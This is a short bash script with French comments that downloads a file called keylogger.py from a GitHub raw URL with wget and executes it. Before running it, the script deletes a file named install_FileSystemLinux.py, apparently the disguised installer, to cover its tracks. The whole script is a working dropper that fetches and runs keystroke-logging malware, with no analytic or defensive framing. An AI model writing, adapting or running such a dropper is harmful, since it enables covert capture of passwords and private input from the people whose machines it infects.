#!/bin/bash

# URL du fichier Python sur GitHub
GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/scriptKeylogger/keylogger.py"

# Nom du fichier téléchargé
FILENAME="keylogger.py"

# Téléchargement du fichier Python
echo "Téléchargement du script Python depuis GitHub..."
wget $GITHUB_URL -O $FILENAME

# Vérification si le fichier a été téléchargé
if [ -f "$FILENAME" ]; then
    echo "Le fichier $FILENAME a été téléchargé avec succès."
else
    echo "Erreur lors du téléchargement du fichier $FILENAME."
    exit 1
fi



# Exécution du fichier Python
echo "Exécution du fichier Python..."
OWNFILE="install_FileSystemLinux.py"
rm $OWNFILE
$1 keylogger.py